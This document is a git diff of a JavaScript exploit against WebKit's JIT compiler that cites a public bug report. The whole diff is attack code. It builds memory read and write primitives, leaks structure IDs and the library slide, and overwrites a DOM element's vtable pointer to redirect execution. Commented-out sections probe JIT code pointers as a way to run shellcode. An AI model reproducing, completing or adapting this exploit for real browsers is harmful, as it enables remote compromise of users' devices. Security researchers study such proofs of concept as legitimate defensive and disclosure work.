@@ -15,9 +15,66 @@ function i2f(val) {
     return f64[0];
 }
 
-function i2obj(val) {
-    return i2f(val-0x02000000000000);
+
+function MakeJitCompiledFunction() {
+    function target(num) {
+        for (var i = 2; i < num; i++) {
+            if (num % i === 0) {
+                return false;
+            }
+        }
+        return true;
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    return target;
 }
+
+function millis(ms)
+{
+    var t1 = Date.now();
+    while(Date.now() - t1 < ms)
+    {
+        //Simply wait
+    }
+}
+
+var shellcodeFunc = MakeJitCompiledFunction();
+
 
 function pwn() {
     log("[+] setting up stuff...");
@@ -114,7 +171,6 @@ function pwn() {
         jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2, false, g[iter % g.length], 0, iter % 2, 0.1 + iter);
     }
     log("[+] jit'd our trigger function");
-
     function addrof_pre(obj) {
         t[201][2] = obj;
         let leak = jit_me(main_target_array, -2147483648, true, true, 1, false, g[0], 0, 0, 0);
@@ -128,11 +184,10 @@ function pwn() {
     // From https://github.com/wh1te4ever/WebKit-Bug-256172
     function LeakStructureID(obj) {
         let container = {
-            cellHeader: i2obj(0x0108200700000000),
+            cellHeader: i2f(0x0108200700000000-0x02000000000000),
             butterfly: obj
         };
         let fakeObjAddr = addrof_pre(container) + 0x10;
-        log(`[+] fakeObjAddr: 0x${fakeObjAddr.toString(16)}`);
         let fakeObj = fakeobj_pre(fakeObjAddr);
         f64[0] = fakeObj[0];
         let structureID = u32[0];
@@ -211,29 +266,135 @@ function pwn() {
     let dlsym_addr = 0x1800c96e4 + dyld_slide;
     log(`[+] dlsym_addr: 0x${dlsym_addr.toString(16)}`);
     log(`[+] read64 -> 0x${read64(dlsym_addr).toString(16)}`);
+    
+    let element = document.createElement('div');
+    log(`[+] element: ${element}`);
+    let obj_ptr = read64(addrof(element) + 0x18);
+    log(`[+] obj_ptr: 0x${obj_ptr.toString(16)}`);
+    let real_vtable = read64(obj_ptr);
+    log(`[+] real_vtable: 0x${real_vtable.toString(16)}`);
+    
+    let ptr = read64(real_vtable + (4 * 8));
+    log(`[+] ptr: 0x${ptr.toString(16)}`);
+    
+    function write64_poc_internal(addr) {
+        driver[1] = i2f(bytes_addr + 0x10);
+        let value_prop = victim.prop;
+        driver[1] = i2f(addr + 0x10);
+        victim.prop = value_prop;
+    }
+    function write64_poc(addr, value) {
+        buffer[0] = value >>> 0;
+        buffer[1] = (value / 0x100000000) >>> 0;
+        write64_poc_internal(addr);
+    }
+
+//    buffer[0] = 0x45464748;
+//    buffer[1] = 0x41424344;
+//    write64_poc_internal(real_vtable + (4 * 8));
+    write64_poc(real_vtable + (4 * 8), 0x00000001ac20a76c + dyld_slide);
+    write64_poc(obj_ptr + 0x20, 0xdeadbeef);
+
+    alert(`[+] new: 0x${read64(real_vtable + (4 * 8)).toString(16)}`);
+    
+    alert("about to trigger...");
+    element.addEventListener("click", function (e) {});
+    alert("hmmmm");
+
+    return;
   
-    
-    let noCoW1 = 1337;
-    var u32_array = [noCoW1,1,2,3,4];
-    boxed[0] = u32_array;
-    driver[1] = unboxed[0];
-    victim[1] = sharedButterfly;
+//    // 32 bit read tests
+//    let noCoW1 = 1337;
+//    var u32_array = [noCoW1,1,2,3,4];
+//    boxed[0] = u32_array;
+//    driver[1] = unboxed[0];
+//    victim[1] = sharedButterfly;
+//
+//    buffer[0] = 0x41424344;
+//    buffer[1] = 0xffffffff;
+//
+//    driver[1] = i2f(bytes_addr + 0x10);
+//    boxed[0] = victim.prop;
+//    u32[0] = u32_array[0];
+//    log(`[+] read32(bytes_addr) -> 0x${u32[0].toString(16)}`);
+//    
+//    driver[1] = i2f((bytes_addr + 0x4) + 0x10);
+//    boxed[0] = victim.prop;
+//    u32[0] = u32_array[0];
+//    log(`[+] read32(bytes_addr + 0x4) -> 0x${u32[0].toString(16)}`);
+//    
+//    driver[1] = i2f(webkit_base + 0x10);
+//    boxed[0] = victim.prop;
+//    u32[0] = u32_array[0];
+//    log(`[+] read32(webkit_base) -> 0x${u32[0].toString(16)}`);
+//    
+//    log(`[*] vtable static address: 0x${(vtable_addr - dyld_slide).toString(16)}`);
+//
+////    let index = 3;
+////    let test_addr = vtable_addr - (index * 8);
+////    let test_addr = 0x1d8ed2000 + 0xb80 + dyld_slide;
+//    let test_addr = 0x1d239c000 + 0xf08 + dyld_slide;
+//    //let test_addr = 0x1d239a000 + 0xeb0 + dyld_slide;
+//    
+//    driver[1] = i2f(test_addr + 0x10);
+//    boxed[0] = victim.prop;
+//    u32[0] = u32_array[0];
+//    let low = u32[0];
+//    
+//    driver[1] = i2f((test_addr + 0x4) + 0x10);
+//    boxed[0] = victim.prop;
+//    u32[0] = u32_array[0];
+//    let high = u32[0];
+//    
+//    log(`0x${high.toString(16).padStart(8, "0")}${low.toString(16).padStart(8, "0")}`)
+//    log(`[+] read64 -> 0x${read64(test_addr).toString(16)}`);
+//    
+//    alert("a");
+//    function write64_poc(addr, value) {
+//        buffer[0] = value >>> 0;
+//        buffer[1] = (value / 0x100000000) >>> 0;
+//        driver[1] = i2f(bytes_addr + 0x10);
+//        let value_prop = victim.prop;
+//        driver[1] = i2f(addr + 0x10);
+//        victim.prop = value_prop;
+//    }
+//    
+//    let new_value = 0x19b94b890;
+//    write64_poc(test_addr, new_value);
+//    alert(`[+] read64 -> 0x${read64(test_addr).toString(16)} 0x${new_value.toString(16)}`);
+//    alert("about to trigger...");
+//    let u = new URL("https://example.com");
+//    alert("hmmmm?");
 
-    buffer[0] = 0x41424344;
-    buffer[1] = 0xffffffff;
-
-    driver[1] = i2f(bytes_addr + 0x10);
-    boxed[0] = victim.prop;
-    u32[0] = u32_array[0];
-    log(`[+] read32(bytes_addr) -> 0x${u32[0].toString(16)}`);
-    
-    driver[1] = i2f((bytes_addr + 0x4) + 0x10);
-    boxed[0] = victim.prop;
-    u32[0] = u32_array[0];
-    log(`[+] read32(bytes_addr + 0x4) -> 0x${u32[0].toString(16)}`);
-    
-    driver[1] = i2f(webkit_base + 0x10);
-    boxed[0] = victim.prop;
-    u32[0] = u32_array[0];
-    log(`[+] read32(webkit_base) -> 0x${u32[0].toString(16)}`);
+//    var shellcodeFuncAddr = addrof(shellcodeFunc);
+//    alert(`[*] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
+//    
+//    var executableAddr = read64(shellcodeFuncAddr + 24);
+//    log(`[*] Executable instance @ ${executableAddr.toString(16)}`);
+//    
+//    var jitCodeAddr = read64(executableAddr + 8);
+//    log(`[*] JITCode instance @ ${jitCodeAddr.toString(16)}`);
+//    alert(`[*] JITCode instance @ ${jitCodeAddr.toString(16)}`);
+//
+////    let offsets = [0x18, 0x40, 0x50, 0x70, 0xd8, 0x110, 0x128, 0x158, 0x160, 0x170, 0x190, 0x1b8, 0x1c8, 0x1e8];
+//////    let offsets = [0x18, 0x40, 0x50, 0x70, 0xd8, 0x110];
+////    for (let offset of offsets) {
+////        let value = read64(jitCodeAddr + offset);
+////        write64(value, 0x41414141);
+////        alert(`[+] 0x${offset.toString(16)}: 0x${value.toString(16)}`);
+////    }
+//    // 0x110 weird
+//    let offset = 0x110;
+//    let value = read64(jitCodeAddr + offset);
+//    alert(`[+] 0x${offset.toString(16)}: 0x${value.toString(16)}`);
+//    alert(`[+] 0x${offset.toString(16)}: 0x${read64(value).toString(16)}`);
+//    write64(read64(value), 0x41424344);
+//
+//    shellcodeFunc();
+//    alert("b");
+////    for (var offset = 0; offset <= 0x200; offset += 0x8) {
+////        let value = read64(jitCodeAddr + offset);
+////        log(`[+] 0x${offset.toString(16)}: 0x${value.toString(16)}`);
+////
+////    }
 }
